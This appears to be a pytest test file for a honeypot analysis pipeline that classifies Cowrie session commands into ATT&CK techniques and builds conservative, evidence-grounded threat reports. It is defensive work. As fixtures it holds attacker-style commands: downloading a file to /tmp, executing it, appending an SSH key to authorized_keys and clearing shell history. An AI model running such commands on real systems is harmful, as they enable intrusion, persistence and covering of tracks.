from __future__ import annotations

import copy
import json
import tempfile
from pathlib import Path

from production.api.monitor_web import _render_report_panel, _report_summary
from production.classification.classification_pipeline import NotebookParityClassifier
from production.classification.trust import is_trusted_classification_event
from production.correlation.session_evidence_graph import build_session_evidence_graph
from production.reporting.actor_attribution import enrich_report_with_actor_attribution
from production.reporting.artifacts import build_stix_bundle, write_markdown_report
from production.reporting.threat_hypothesis import (
    apply_validated_vertex_presentation,
    attach_model_prediction,
    build_v2_report,
)
from production.utils.config import ProductionConfig
from production.workers.session_monitor import SessionMonitor


class _Mitre:
    TACTICS = {
        "T1033": ["discovery"],
        "T1082": ["discovery"],
        "T1105": ["command-and-control"],
        "T1059": ["execution"],
        "T1098": ["persistence"],
        "T1070": ["defense-evasion"],
        "T1562": ["defense-evasion"],
    }

    @classmethod
    def get_tactics(cls, tid):
        return cls.TACTICS.get(tid, [])

    @staticmethod
    def get_name(tid):
        return tid


def _event(
    command: str,
    ttp: str,
    tactic: str,
    index: int,
    *,
    source: str = "rule",
    outcome: str = "outcome_unknown",
    confidence: float = 1.0,
    high_confidence: bool = True,
) -> dict:
    return {
        "command": command,
        "ttp": ttp,
        "tactic": tactic,
        "source": source,
        "confidence": confidence,
        "high_confidence": high_confidence,
        "evidence_id": f"evidence-{index}",
        "command_outcome": outcome,
        "event_timestamp": f"2026-07-15T00:00:{index:02d}Z",
        "cowrie_eventid": "cowrie.command.input",
    }


def _payload(events: list[dict], raw_events: list[dict] | None = None) -> dict:
    return {
        "session_id": "v2-test-session",
        "commands": [event["command"] for event in events],
        "classification_events": events,
        "raw_events": raw_events or [],
    }


def test_classifier_agreement_matrix_enforces_trust_boundary() -> None:
    exact = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1033", 0.99),
        mitre_db=_Mitre(),
    ).classify("whoami")[0]
    assert exact["source"] == "both"
    assert exact["agreement_status"] == "exact_technique_agreement"
    assert is_trusted_classification_event(exact) is True

    tactic_only = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1082", 0.99),
        mitre_db=_Mitre(),
    ).classify("whoami")[0]
    assert tactic_only["agreement_status"] == "tactic_only_disagreement"
    assert is_trusted_classification_event(tactic_only) is False

    full_disagreement = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1105", 0.99),
        mitre_db=_Mitre(),
    ).classify("whoami")[0]
    assert full_disagreement["agreement_status"] == "technique_and_tactic_disagreement"
    assert is_trusted_classification_event(full_disagreement) is False

    low_model_with_rule = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1082", 0.20),
        mitre_db=_Mitre(),
    ).classify("whoami")[0]
    assert low_model_with_rule["source"] == "rule"
    assert low_model_with_rule["agreement_status"] == "rule_only"
    assert is_trusted_classification_event(low_model_with_rule) is True

    model_only = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1082", 0.99),
        mitre_db=_Mitre(),
    ).classify("printf system-facts")[0]
    assert model_only["source"] == "securebert"
    assert model_only["agreement_status"] == "model_only"
    assert is_trusted_classification_event(model_only) is True

    low_model_only = NotebookParityClassifier(
        bert_fn=lambda _command: ("T1562", 0.20),
        mitre_db=_Mitre(),
    ).classify("printf opaque-candidate")[0]
    assert low_model_only["source"] == "securebert_low_confidence"
    assert is_trusted_classification_event(low_model_only) is False

    shell_noise = NotebookParityClassifier(mitre_db=_Mitre()).classify("exit")[0]
    assert shell_noise["source"] == "shell_noise"
    assert is_trusted_classification_event(shell_noise) is False


def test_session_monitor_retains_outcome_policy_provenance_and_fragment_order() -> None:
    monitor = SessionMonitor(
        mitre_db=_Mitre(),
        classification_fn=NotebookParityClassifier(mitre_db=_Mitre()).classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    event = {
        "session": "outcome-v2",
        "src_ip": "192.0.2.10",
        "timestamp": "2026-07-15T00:00:00Z",
        "eventid": "cowrie.command.success",
        "input": "whoami && uname -a",
        "success": 1,
    }
    monitor.on_event(event)
    state = monitor.get_session("outcome-v2")
    assert [item["subcommand_index"] for item in state.classification_events] == [0, 1]
    assert all(item["command_outcome"] == "cowrie_reported_success" for item in state.classification_events)
    assert all(item["event_timestamp"] == event["timestamp"] for item in state.classification_events)
    assert all(item["cowrie_eventid"] == "cowrie.command.success" for item in state.classification_events)
    assert all(item["evidence_id"].startswith("class_") for item in state.classification_events)
    assert all("rule_policy_id" in item and "confidence_semantics" in item for item in state.classification_events)

    graph = build_session_evidence_graph({
        "session_id": state.session_id,
        "commands": state.commands,
        "classification_events": state.classification_events,
        "raw_events": state.raw_events,
    })
    assert [item["command"] for item in graph["ordered_behavior_chain"]] == ["whoami", "uname -a"]
    assert all(item["command_outcome"] == "cowrie_reported_success" for item in graph["ordered_behavior_chain"])

    legacy = build_session_evidence_graph(_payload([
        {
            "command": "whoami",
            "ttp": "T1033",
            "tactic": "discovery",
            "source": "rule",
            "confidence": 1.0,
        }
    ]))
    assert legacy["ordered_behavior_chain"][0]["command_outcome"] == "legacy_outcome_unknown"


def test_weak_candidates_remain_audit_only_in_canonical_report() -> None:
    events = [
        _event("whoami", "T1033", "discovery", 1),
        _event(
            "printf opaque",
            "T1562",
            "defense-evasion",
            2,
            source="securebert_low_confidence",
            confidence=0.20,
            high_confidence=False,
        ),
    ]
    report = build_v2_report({}, [_payload(events)])
    observed = report["observed_behavior"]
    assert [item["technique_id"] for item in observed["trusted_attck_candidates"]] == ["T1033"]
    assert observed["audit_only_candidates"][0]["candidate_ttp"] == "T1562"
    assert "T1562" not in json.dumps(observed["ordered_behavior_chain"])
    assert "T1562" not in json.dumps(report["supported_assessment"])
    assert "T1562" not in json.dumps(report["follow_on_hypothesis"])
    assert "T1562" not in json.dumps(report["kill_chain_analysis"])
    assert report["threat_actor_profile"]["type"] == "Unknown"
    assert report["follow_on_hypothesis"]["abstained"] is True
    stale_payload = _payload(events)
    stale_payload["ttps"] = ["T1562"]
    bundle = build_stix_bundle(report, stale_payload)
    attack_ids = {
        ref.get("external_id")
        for item in bundle["objects"]
        if item.get("type") == "attack-pattern"
        for ref in item.get("external_references") or []
    }
    assert attack_ids == {"T1033"}

    weak_only_payload = _payload([events[1]])
    weak_only_payload["ttps"] = ["T1562"]
    weak_only_report = build_v2_report({}, [weak_only_payload])
    weak_only_bundle = build_stix_bundle(weak_only_report, weak_only_payload)
    assert not any(
        item.get("type") == "attack-pattern"
        for item in weak_only_bundle["objects"]
    )


def test_v2_claims_are_conservative_for_download_transfer_execution_and_persistence() -> None:
    downloader = _event("curl https://example.invalid/a -o /tmp/a", "T1105", "command-and-control", 1)
    report = build_v2_report({}, [_payload([downloader])])
    objective = report["supported_assessment"]["possible_objectives"][0]
    assert objective["claim_type"] == "possible_tool_transfer_or_staging"
    assert objective["evidence_status"] == "partially_supported"
    assert report["follow_on_hypothesis"]["claims"] == []
    assert report["follow_on_hypothesis"]["abstained"] is True
    gaps = " ".join(item["text"] for item in report["follow_on_hypothesis"]["evidence_gaps"])
    assert "No Cowrie file-download event" in gaps
    assert "No subsequent explicit artifact-execution" in gaps
    assert "No persistence-related command" in gaps

    transfer_report = build_v2_report({}, [_payload(
        [downloader],
        [{"eventid": "cowrie.session.file_download", "timestamp": "2026-07-15T00:00:02Z", "shasum": "abc"}],
    )])
    assert transfer_report["observed_behavior"]["cowrie_event_evidence"][0]["transfer_observed"] is True
    transfer_claim = next(
        claim
        for claim in transfer_report["supported_assessment"]["possible_objectives"]
        if claim["claim_type"] == "observed_cowrie_file_transfer"
    )
    assert transfer_claim["evidence_status"] == "supported"
    assert "does not establish artifact execution" in transfer_claim["limitations"][0]
    assert not any(
        claim["claim_type"] == "possible_artifact_execution"
        for claim in transfer_report["supported_assessment"]["possible_objectives"]
    )

    unknown_execution = _event("sh /tmp/a", "T1059", "execution", 2)
    unknown_execution_report = build_v2_report({}, [_payload([downloader, unknown_execution])])
    attempt_claim = next(
        claim
        for claim in unknown_execution_report["supported_assessment"]["possible_objectives"]
        if claim["claim_type"] == "attempted_artifact_execution"
    )
    assert attempt_claim["evidence_status"] == "partially_supported"
    assert "outcome is unavailable" in attempt_claim["text"]
    assert not any(
        claim["claim_type"] == "possible_artifact_execution"
        for claim in unknown_execution_report["supported_assessment"]["possible_objectives"]
    )

    failed_execution = _event(
        "sh /tmp/a",
        "T1059",
        "execution",
        2,
        outcome="cowrie_reported_failure",
    )
    failed_execution_report = build_v2_report({}, [_payload([downloader, failed_execution])])
    failed_attempt = next(
        claim
        for claim in failed_execution_report["supported_assessment"]["possible_objectives"]
        if claim["claim_type"] == "attempted_artifact_execution"
    )
    assert failed_attempt["evidence_status"] == "supported"
    assert "reported failure" in failed_attempt["text"]

    execution = _event(
        "sh /tmp/a",
        "T1059",
        "execution",
        2,
        outcome="cowrie_reported_success",
    )
    execution_report = build_v2_report({}, [_payload([downloader, execution])])
    execution_claim = next(
        claim
        for claim in execution_report["supported_assessment"]["possible_objectives"]
        if claim["claim_type"] == "possible_artifact_execution"
    )
    assert execution_claim["evidence_status"] == "supported"
    assert "reported success" in execution_claim["text"]

    persistence = _event(
        "echo ssh-ed25519 AAA >> ~/.ssh/authorized_keys",
        "T1098",
        "persistence",
        3,
    )
    cleanup = _event("history -c", "T1070", "defense-evasion", 4)
    combined = build_v2_report({}, [_payload([persistence, cleanup])])
    claim_types = {
        claim["claim_type"]
        for claim in combined["supported_assessment"]["possible_objectives"]
    }
    assert claim_types == {"possible_continued_access_preparation", "possible_trace_removal"}
    assert combined["follow_on_hypothesis"]["basis_last_evidence_id"] == "evidence-4"
    assert combined["follow_on_hypothesis"]["abstained"] is True


def test_follow_on_without_an_incomplete_connected_chain_abstains() -> None:
    downloader = _event("wget https://example.invalid/a", "T1105", "command-and-control", 1)
    discovery = _event("whoami", "T1033", "discovery", 2)

    downloader_then_discovery = build_v2_report({}, [_payload([downloader, discovery])])
    assert downloader_then_discovery["follow_on_hypothesis"]["basis_last_evidence_id"] == "evidence-2"
    assert downloader_then_discovery["follow_on_hypothesis"]["abstained"] is True

    discovery_first = {
        **discovery,
        "event_timestamp": "2026-07-15T00:00:01Z",
    }
    downloader_second = {
        **downloader,
        "event_timestamp": "2026-07-15T00:00:02Z",
    }
    discovery_then_downloader = build_v2_report(
        {},
        [_payload([discovery_first, downloader_second])],
    )
    assert discovery_then_downloader["follow_on_hypothesis"]["basis_last_evidence_id"] == "evidence-1"
    assert discovery_then_downloader["follow_on_hypothesis"]["abstained"] is True

    discovery_only = build_v2_report({}, [_payload([discovery])])
    assert discovery_only["supported_assessment"]["assessment_status"] == "observed_behavior_only"
    assert discovery_only["supported_assessment"]["possible_objectives"] == []
    assert discovery_only["follow_on_hypothesis"]["abstained"] is True

    late_downloader = {
        **downloader,
        "event_timestamp": "2026-07-15T00:00:03Z",
    }
    early_discovery = {
        **discovery,
        "event_timestamp": "2026-07-15T00:00:01Z",
    }
    timestamp_ordered = build_v2_report({}, [_payload([late_downloader, early_discovery])])
    ordered_commands = [
        item["command"]
        for item in timestamp_ordered["observed_behavior"]["ordered_behavior_chain"]
    ]
    assert ordered_commands == ["whoami", "wget https://example.invalid/a"]
    assert timestamp_ordered["follow_on_hypothesis"]["basis_last_evidence_id"] == "evidence-1"
    assert timestamp_ordered["follow_on_hypothesis"]["abstained"] is True


def test_context_and_prediction_cannot_promote_behavioral_claims() -> None:
    events = [_event("curl https://example.invalid/a", "T1105", "command-and-control", 1)]
    payload = _payload(events)
    base = build_v2_report({}, [payload])
    enriched = build_v2_report(
        {
            "ioc_table": [{"type": "ipv4", "value": "192.0.2.1", "vt_hit": True}],
            "sigma_hits": ["high-risk-context"],
            "kev_matches": ["CVE-2099-0001"],
        },
        [payload],
    )
    assert enriched["supported_assessment"] == base["supported_assessment"]
    assert enriched["follow_on_hypothesis"] == base["follow_on_hypothesis"]
    assert enriched["contextual_intelligence"]["influence_policy"] == "context_only_not_behavioral_claim_evidence"

    claims_before = copy.deepcopy(base["supported_assessment"])
    predicted = attach_model_prediction(base, {
        "payload": {
            "snapshot_id": "snapshot-1",
            "generated_at": "2026-07-15T00:00:10Z",
            "prediction_mode": "primary_transition_with_fallback",
            "primary_model": "local_transition",
            "final_ranking": [{"tactic": "execution", "score": 0.7}],
            "coverage": {"covered": True},
        }
    })
    assert predicted["model_prediction"]["prediction_mode"] == "primary_transition_with_fallback"
    assert predicted["model_prediction"]["next_tactic_ranking"][0]["tactic"] == "execution"
    assert predicted["supported_assessment"] == claims_before


def test_vertex_output_is_presentation_only_and_rejected_when_ungrounded() -> None:
    report = build_v2_report({}, [_payload([
        _event("curl https://example.invalid/a -o /tmp/a", "T1105", "command-and-control", 1)
    ])])
    canonical_before = copy.deepcopy({
        "observed_behavior": report["observed_behavior"],
        "supported_assessment": report["supported_assessment"],
        "follow_on_hypothesis": report["follow_on_hypothesis"],
        "model_prediction": report["model_prediction"],
        "recommendations": report["recommendations"],
    })
    claim_id = report["supported_assessment"]["possible_objectives"][0]["claim_id"]

    rejected = apply_validated_vertex_presentation(report, {
        "presentation_summary": "The actor successfully compromised the victim and executed malware.",
        "grounded_claim_ids": [claim_id],
    })
    assert rejected["presentation"]["vertex_validation"]["status"] == "rejected"
    assert rejected["presentation"]["ai_enriched"] is False

    transfer_overclaim = apply_validated_vertex_presentation(rejected, {
        "presentation_summary": "The downloaded artifact may be executed later.",
        "grounded_claim_ids": [claim_id],
    })
    assert transfer_overclaim["presentation"]["vertex_validation"] == {
        "status": "rejected",
        "reason": "unsupported_transfer_completion_claim",
    }

    accepted = apply_validated_vertex_presentation(transfer_overclaim, {
        "presentation_summary": "The observed session contains a downloader command that supports possible tool staging.",
        "grounded_claim_ids": [claim_id],
    })
    assert accepted["presentation"]["vertex_validation"]["status"] == "accepted"
    assert accepted["presentation"]["authority"] == "presentation_only"
    for key, value in canonical_before.items():
        assert accepted[key] == value


def test_actor_similarity_is_disabled_by_default_and_non_attributive_when_enabled() -> None:
    assert ProductionConfig().enable_actor_attribution is False
    payload = _payload([
        _event("whoami", "T1033", "discovery", 1),
        _event("curl https://example.invalid/a", "T1105", "command-and-control", 2),
    ])
    report = build_v2_report({}, [payload])
    with tempfile.TemporaryDirectory() as tmp:
        actor_db = Path(tmp) / "actors.json"
        actor_db.write_text(json.dumps({"actor_db": {"Example Group": ["T1033", "T1105"]}}), encoding="utf-8")
        enriched = enrich_report_with_actor_attribution(report, payload, str(actor_db), mitre_db=_Mitre())
    assert "actor_matches" not in enriched
    similarity = enriched["contextual_intelligence"]["ttp_similarity"]
    assert similarity["status"] == "matched"
    assert similarity["not_attribution"] is True
    assert "not be interpreted" in similarity["semantics"]

    weak_payload = _payload([
        _event(
            "printf opaque",
            "T1562",
            "defense-evasion",
            1,
            source="securebert_low_confidence",
            confidence=0.20,
            high_confidence=False,
        ),
    ])
    weak_payload["ttps"] = ["T1562"]
    weak_report = build_v2_report({}, [weak_payload])
    with tempfile.TemporaryDirectory() as tmp:
        actor_db = Path(tmp) / "actors.json"
        actor_db.write_text(
            json.dumps({"actor_db": {"Example Group": ["T1562"]}}),
            encoding="utf-8",
        )
        weak_enriched = enrich_report_with_actor_attribution(
            weak_report,
            weak_payload,
            str(actor_db),
            mitre_db=_Mitre(),
        )
    assert weak_enriched["contextual_intelligence"]["ttp_similarity"]["status"] == "no_specific_actor"
    assert weak_enriched["contextual_intelligence"]["ttp_similarity"]["matches"] == []


def test_v2_and_legacy_consumers_render_without_schema_breakage() -> None:
    payload = _payload([_event("whoami", "T1033", "discovery", 1)])
    payload["ttps"] = ["T1033", "T1562"]
    report = build_v2_report({}, [payload])
    summary = _report_summary(report, {})
    assert summary["confidence"] == "Unscored"
    assert summary["analytical_evidence_strength"] == "observed_behavior_only"
    assert "Observed 1 trusted" in summary["summary"]
    panel = _render_report_panel(
        {
            "analysis_status": "succeeded",
            "report_row": {"payload_json": json.dumps(report)},
            "job": {"status": "succeeded", "report_id": "v2-report"},
        },
        "/tmp/nonexistent-v2-report-dir",
    )
    assert "claim evidence status" in panel
    assert "per-claim categorical status; no global probability" in panel
    assert "Observed 1 trusted" in panel

    legacy = {
        "campaign_name": "Legacy report",
        "confidence": "Low",
        "executive_summary": "Legacy summary remains readable.",
        "threat_hypothesis": {
            "predicted_next_action": "Legacy bounded next action",
            "analytical_confidence": {"level": "Low", "reason": "legacy"},
        },
    }
    legacy_summary = _report_summary(legacy, {})
    assert legacy_summary["summary"] == "Legacy summary remains readable."
    assert legacy_summary["post_session_follow_on_hypothesis"] == "Legacy bounded next action"

    bundle = build_stix_bundle(report, payload)
    attack_ids = {
        ref.get("external_id")
        for item in bundle["objects"]
        if item.get("type") == "attack-pattern"
        for ref in item.get("external_references") or []
    }
    assert attack_ids == {"T1033"}

    with tempfile.TemporaryDirectory() as tmp:
        path = write_markdown_report(report, payload, Path(tmp))
        rendered = Path(path).read_text(encoding="utf-8")
    assert "## Evidence-Grounded Assessment" in rendered
    assert "No attacker objective inferred" in rendered
